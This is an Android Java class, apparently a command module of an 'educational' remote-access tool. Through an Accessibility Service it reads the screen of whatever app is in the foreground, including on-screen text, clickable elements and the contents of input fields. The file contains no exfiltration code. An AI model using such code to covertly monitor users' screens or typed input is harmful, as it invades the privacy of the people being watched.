package com.remoteaccess.educational.commands;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * SCREEN READER - Read Screen Content
 * 
 * ⚠️ EDUCATIONAL PURPOSE ONLY
 * - Requires Accessibility Service
 * - Reads all visible UI elements
 * - Extracts text, buttons, inputs
 * 
 * USE CASES:
 * - Screen content analysis
 * - UI automation
 * - Accessibility testing
 */
public class ScreenReader {

    private AccessibilityService accessibilityService;

    public ScreenReader(AccessibilityService service) {
        this.accessibilityService = service;
    }

    /**
     * Read all screen content
     */
    public JSONObject readScreen() {
        JSONObject result = new JSONObject();
        
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            JSONObject screenData = new JSONObject();
            screenData.put("packageName", rootNode.getPackageName());
            screenData.put("className", rootNode.getClassName());
            
            // Read all elements
            JSONArray elements = new JSONArray();
            readNodeRecursive(rootNode, elements, 0);
            
            screenData.put("elements", elements);
            screenData.put("elementCount", elements.length());

            rootNode.recycle();

            result.put("success", true);
            result.put("screen", screenData);
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Read node recursively
     */
    private void readNodeRecursive(AccessibilityNodeInfo node, JSONArray elements, int depth) {
        if (node == null || depth > 10) return; // Limit depth to avoid infinite loops
        
        try {
            JSONObject element = new JSONObject();
            
            // Basic info
            element.put("className", node.getClassName());
            element.put("depth", depth);
            
            // Text content
            if (node.getText() != null) {
                element.put("text", node.getText().toString());
            }
            
            // Content description
            if (node.getContentDescription() != null) {
                element.put("description", node.getContentDescription().toString());
            }
            
            // View ID
            if (node.getViewIdResourceName() != null) {
                element.put("viewId", node.getViewIdResourceName());
            }
            
            // Properties
            element.put("clickable", node.isClickable());
            element.put("focusable", node.isFocusable());
            element.put("editable", node.isEditable());
            element.put("scrollable", node.isScrollable());
            element.put("checkable", node.isCheckable());
            element.put("checked", node.isChecked());
            element.put("enabled", node.isEnabled());
            element.put("selected", node.isSelected());
            
            // Bounds
            android.graphics.Rect bounds = new android.graphics.Rect();
            node.getBoundsInScreen(bounds);
            JSONObject boundsObj = new JSONObject();
            boundsObj.put("left", bounds.left);
            boundsObj.put("top", bounds.top);
            boundsObj.put("right", bounds.right);
            boundsObj.put("bottom", bounds.bottom);
            element.put("bounds", boundsObj);
            
            elements.put(element);
            
            // Read children
            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    readNodeRecursive(child, elements, depth + 1);
                    child.recycle();
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Find elements by text
     */
    public JSONObject findByText(String text) {
        JSONObject result = new JSONObject();
        
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            java.util.List<AccessibilityNodeInfo> nodes = 
                rootNode.findAccessibilityNodeInfosByText(text);
            
            JSONArray matches = new JSONArray();
            
            for (AccessibilityNodeInfo node : nodes) {
                JSONObject match = new JSONObject();
                match.put("text", node.getText() != null ? node.getText().toString() : "");
                match.put("className", node.getClassName());
                match.put("clickable", node.isClickable());
                
                android.graphics.Rect bounds = new android.graphics.Rect();
                node.getBoundsInScreen(bounds);
                JSONObject boundsObj = new JSONObject();
                boundsObj.put("left", bounds.left);
                boundsObj.put("top", bounds.top);
                boundsObj.put("right", bounds.right);
                boundsObj.put("bottom", bounds.bottom);
                match.put("bounds", boundsObj);
                
                matches.put(match);
                node.recycle();
            }

            rootNode.recycle();

            result.put("success", true);
            result.put("query", text);
            result.put("matches", matches);
            result.put("count", matches.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get current app info
     */
    public JSONObject getCurrentApp() {
        JSONObject result = new JSONObject();
        
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            String packageName = rootNode.getPackageName() != null ? 
                rootNode.getPackageName().toString() : "unknown";
            
            String className = rootNode.getClassName() != null ? 
                rootNode.getClassName().toString() : "unknown";

            rootNode.recycle();

            result.put("success", true);
            result.put("packageName", packageName);
            result.put("className", className);
            
            // Get app name
            try {
                android.content.pm.PackageManager pm = accessibilityService.getPackageManager();
                android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
                String appName = pm.getApplicationLabel(appInfo).toString();
                result.put("appName", appName);
            } catch (Exception e) {
                result.put("appName", packageName);
            }
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get all clickable elements
     */
    public JSONObject getClickableElements() {
        JSONObject result = new JSONObject();
        
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            JSONArray clickables = new JSONArray();
            findClickableNodes(rootNode, clickables);

            rootNode.recycle();

            result.put("success", true);
            result.put("clickables", clickables);
            result.put("count", clickables.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Find clickable nodes recursively
     */
    private void findClickableNodes(AccessibilityNodeInfo node, JSONArray clickables) {
        if (node == null) return;
        
        try {
            if (node.isClickable()) {
                JSONObject clickable = new JSONObject();
                clickable.put("text", node.getText() != null ? node.getText().toString() : "");
                clickable.put("description", node.getContentDescription() != null ? 
                    node.getContentDescription().toString() : "");
                clickable.put("className", node.getClassName());
                
                android.graphics.Rect bounds = new android.graphics.Rect();
                node.getBoundsInScreen(bounds);
                JSONObject boundsObj = new JSONObject();
                boundsObj.put("centerX", (bounds.left + bounds.right) / 2);
                boundsObj.put("centerY", (bounds.top + bounds.bottom) / 2);
                clickable.put("bounds", boundsObj);
                
                clickables.put(clickable);
            }
            
            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    findClickableNodes(child, clickables);
                    child.recycle();
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Get all input fields
     */
    public JSONObject getInputFields() {
        JSONObject result = new JSONObject();
        
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }

            JSONArray inputs = new JSONArray();
            findInputNodes(rootNode, inputs);

            rootNode.recycle();

            result.put("success", true);
            result.put("inputs", inputs);
            result.put("count", inputs.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Find input nodes recursively
     */
    private void findInputNodes(AccessibilityNodeInfo node, JSONArray inputs) {
        if (node == null) return;
        
        try {
            if (node.isEditable()) {
                JSONObject input = new JSONObject();
                input.put("text", node.getText() != null ? node.getText().toString() : "");
                input.put("hint", node.getHintText() != null ? node.getHintText().toString() : "");
                input.put("className", node.getClassName());
                
                android.graphics.Rect bounds = new android.graphics.Rect();
                node.getBoundsInScreen(bounds);
                JSONObject boundsObj = new JSONObject();
                boundsObj.put("centerX", (bounds.left + bounds.right) / 2);
                boundsObj.put("centerY", (bounds.top + bounds.bottom) / 2);
                input.put("bounds", boundsObj);
                
                inputs.put(input);
            }
            
            int childCount = node.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    findInputNodes(child, inputs);
                    child.recycle();
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
